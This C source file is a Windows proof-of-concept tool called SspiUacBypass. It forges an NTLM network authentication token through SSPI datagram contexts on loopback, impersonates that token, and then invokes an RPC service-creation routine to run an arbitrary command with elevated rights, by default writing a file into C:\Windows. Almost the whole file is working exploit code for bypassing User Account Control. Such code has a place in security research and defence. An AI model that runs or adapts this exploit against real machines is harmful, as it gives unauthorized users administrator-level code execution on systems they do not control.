#define SECURITY_WIN32

#include <Windows.h>
#include <stdio.h>
#include <Security.h>
#include "CreateSvcRpc.h"

#define SEC_SUCCESS(Status) ((Status) >= 0)
#define MAX_MESSAGE_SIZE 12000

#pragma comment (lib, "Secur32.lib")
#pragma warning(disable : 4996) //_CRT_SECURE_NO_WARNINGS

HANDLE ForgeNetworkAuthToken();
void CheckTokenSession(HANDLE hToken);
BOOL IsThreadTokenIdentification();
void hexDump(char* desc, void* addr, int len);

int main(int argc, char* argv[])
{
	char defaultCmdline[] = "cmd /c \"echo SspiUacBypass > C:\\Windows\\bypassuac.txt\"";
	char* cmdline = defaultCmdline;
	HANDLE hNetworkToken = INVALID_HANDLE_VALUE;

	if (argc > 1)
		cmdline = argv[1];

	printf("\n\tSspiUacBypass - Bypassing UAC with SSPI Datagram Contexts\n\tby @splinter_code\n\n");
	printf("Forging a token from a fake Network Authentication through Datagram Contexts\n");
	hNetworkToken = ForgeNetworkAuthToken();
	if (hNetworkToken == INVALID_HANDLE_VALUE) {
		printf("Cannot forge the network auth token, exiting...\n");
		exit(-1);
	}
	printf("Network Authentication token forged correctly, handle --> 0x%x\n", hNetworkToken);
	CheckTokenSession(hNetworkToken);
	ImpersonateLoggedOnUser(hNetworkToken);
	// Some Windows versions check if the current process token session ID matches the forged token session ID
	// Older Windows versions don't, so trying anyway to impersonate even if the forged token session ID is 0
	if (IsThreadTokenIdentification()) {
		printf("Impersonating the forged token returned an Identification token. Bypass failed :( \n");
	}
	else {
		printf("Bypass Success! Now impersonating the forged token... Loopback network auth should be seen as elevated now\n");
		InvokeCreateSvcRpcMain(cmdline);
	}
	RevertToSelf();
	CloseHandle(hNetworkToken);
	return 0;
}

HANDLE ForgeNetworkAuthToken() {
	CredHandle hCredClient, hCredServer;
	TimeStamp lifetimeClient, lifetimeServer;
	SecBufferDesc negotiateDesc, challengeDesc, authenticateDesc;
	SecBuffer negotiateBuffer, challengeBuffer, authenticateBuffer;
	CtxtHandle clientContextHandle, serverContextHandle;
	ULONG clientContextAttributes, serverContextAttributes;
	SECURITY_STATUS secStatus;
	HANDLE hTokenNetwork = INVALID_HANDLE_VALUE;

	secStatus = AcquireCredentialsHandle(NULL, (LPWSTR)NTLMSP_NAME, SECPKG_CRED_OUTBOUND, NULL, NULL, NULL, NULL, &hCredClient, &lifetimeClient);
	if (!SEC_SUCCESS(secStatus)) {
		printf("AcquireCredentialsHandle Client failed with secstatus code 0x%x \n", secStatus);
		exit(-1);
	}

	secStatus = AcquireCredentialsHandle(NULL, (LPWSTR)NTLMSP_NAME, SECPKG_CRED_INBOUND, NULL, NULL, NULL, NULL, &hCredServer, &lifetimeServer);
	if (!SEC_SUCCESS(secStatus)) {
		printf("AcquireCredentialsHandle Server failed with secstatus code 0x%x \n", secStatus);
		exit(-1);
	}

	negotiateDesc.ulVersion = 0;
	negotiateDesc.cBuffers = 1;
	negotiateDesc.pBuffers = &negotiateBuffer;
	negotiateBuffer.cbBuffer = MAX_MESSAGE_SIZE;
	negotiateBuffer.BufferType = SECBUFFER_TOKEN;
	negotiateBuffer.pvBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_MESSAGE_SIZE);
	secStatus = InitializeSecurityContext(&hCredClient, NULL, NULL, ISC_REQ_DATAGRAM, 0, SECURITY_NATIVE_DREP, NULL, 0, &clientContextHandle, &negotiateDesc, &clientContextAttributes, &lifetimeClient);
	if (!SEC_SUCCESS(secStatus)) {
		printf("InitializeSecurityContext Type 1 failed with secstatus code 0x%x \n", secStatus);
		exit(-1);
	}
	printf("NTLM Negotiate Type1 buffer (size %d): \n", negotiateBuffer.cbBuffer);
	hexDump(NULL, negotiateBuffer.pvBuffer, negotiateBuffer.cbBuffer);

	challengeDesc.ulVersion = 0;
	challengeDesc.cBuffers = 1;
	challengeDesc.pBuffers = &challengeBuffer;
	challengeBuffer.cbBuffer = MAX_MESSAGE_SIZE;
	challengeBuffer.BufferType = SECBUFFER_TOKEN;
	challengeBuffer.pvBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_MESSAGE_SIZE);
	secStatus = AcceptSecurityContext(&hCredServer, NULL, &negotiateDesc, ASC_REQ_DATAGRAM, SECURITY_NATIVE_DREP, &serverContextHandle, &challengeDesc, &serverContextAttributes, &lifetimeServer);
	if (!SEC_SUCCESS(secStatus)) {
		printf("AcceptSecurityContext Type 2 failed with secstatus code 0x%x \n", secStatus);
		exit(-1);
	}
	printf("NTLM Challenge Type2 buffer (size %d): \n", challengeBuffer.cbBuffer);
	hexDump(NULL, challengeBuffer.pvBuffer, challengeBuffer.cbBuffer);

	authenticateDesc.ulVersion = 0;
	authenticateDesc.cBuffers = 1;
	authenticateDesc.pBuffers = &authenticateBuffer;
	authenticateBuffer.cbBuffer = MAX_MESSAGE_SIZE;
	authenticateBuffer.BufferType = SECBUFFER_TOKEN;
	authenticateBuffer.pvBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_MESSAGE_SIZE);
	secStatus = InitializeSecurityContext(NULL, &clientContextHandle, NULL, 0, 0, SECURITY_NATIVE_DREP, &challengeDesc, 0, &clientContextHandle, &authenticateDesc, &clientContextAttributes, &lifetimeClient);
	if (!SEC_SUCCESS(secStatus)) {
		printf("InitializeSecurityContext Type 3 failed with secstatus code 0x%x \n", secStatus);
		exit(-1);
	}
	printf("NTLM Authenticate Type3 buffer (size %d): \n", authenticateBuffer.cbBuffer);
	hexDump(NULL, authenticateBuffer.pvBuffer, authenticateBuffer.cbBuffer);

	secStatus = AcceptSecurityContext(NULL, &serverContextHandle, &authenticateDesc, 0, SECURITY_NATIVE_DREP, &serverContextHandle, NULL, &serverContextAttributes, &lifetimeServer);
	if (!SEC_SUCCESS(secStatus)) {
		printf("AcceptSecurityContext failed with secstatus code 0x%x \n", secStatus);
		exit(-1);
	}
	QuerySecurityContextToken(&serverContextHandle, &hTokenNetwork);

	HeapFree(GetProcessHeap(), 0, negotiateBuffer.pvBuffer);
	HeapFree(GetProcessHeap(), 0, challengeBuffer.pvBuffer);
	HeapFree(GetProcessHeap(), 0, authenticateBuffer.pvBuffer);
	FreeCredentialsHandle(&hCredClient);
	FreeCredentialsHandle(&hCredServer);
	DeleteSecurityContext(&clientContextHandle);
	DeleteSecurityContext(&serverContextHandle);

	return hTokenNetwork;
}

void CheckTokenSession(HANDLE hToken) {
	DWORD retLenght = 0;
	DWORD tokenSessionId = 0;
	if (!GetTokenInformation(hToken, TokenSessionId, &tokenSessionId, sizeof(DWORD), &retLenght)) {
		printf("GetTokenInformation failed with error code %d \n", GetLastError());
		exit(-1);
	}
	// This should be always true for Windows versions <= 10 Build 1809 
	if (tokenSessionId == 0)
		printf("Forged Token Session ID set to 0. Older Win version detected, lsasrv!LsapApplyLoopbackSessionId probably not present here...\n");
	else
		printf("Forged Token Session ID set to %d. lsasrv!LsapApplyLoopbackSessionId adjusted the token to our current session \n", tokenSessionId);
}

BOOL IsThreadTokenIdentification() {
	HANDLE hTokenImp;
	SECURITY_IMPERSONATION_LEVEL impLevel;
	DWORD retLenght = 0;
	if (!OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &hTokenImp)) {
		printf("OpenThreadToken failed with error code %d \n", GetLastError());
		exit(-1);
	}
	if (!GetTokenInformation(hTokenImp, TokenImpersonationLevel, &impLevel, sizeof(SECURITY_IMPERSONATION_LEVEL), &retLenght)) {
		printf("GetTokenInformation failed with error code %d \n", GetLastError());
		exit(-1);
	}
	if (impLevel < SecurityImpersonation)
		return TRUE;
	else
		return FALSE;
	CloseHandle(hTokenImp);
}

void hexDump(char* desc, void* addr, int len) {
	int i;
	unsigned char buff[17];
	unsigned char* pc = (unsigned char*)addr;

	// Output description if given.
	if (desc != NULL)
		printf("%s:\n", desc);

	if (len == 0) {
		printf("  ZERO LENGTH\n");
		return;
	}
	if (len < 0) {
		printf("  NEGATIVE LENGTH: %i\n", len);
		return;
	}

	// Process every byte in the data.
	for (i = 0; i < len; i++) {
		// Multiple of 16 means new line (with line offset).

		if ((i % 16) == 0) {
			// Just don't print ASCII for the zeroth line.
			if (i != 0)
				printf("  %s\n", buff);

			// Output the offset.
			printf("  %04x ", i);
		}

		// Now the hex code for the specific character.
		printf(" %02x", pc[i]);

		// And store a printable ASCII character for later.
		if ((pc[i] < 0x20) || (pc[i] > 0x7e))
			buff[i % 16] = '.';
		else
			buff[i % 16] = pc[i];
		buff[(i % 16) + 1] = '\0';
	}

	// Pad out last line if not exactly 16 characters.
	while ((i % 16) != 0) {
		printf("   ");
		i++;
	}

	// And print the final ASCII bit.
	printf("  %s\n", buff);
}
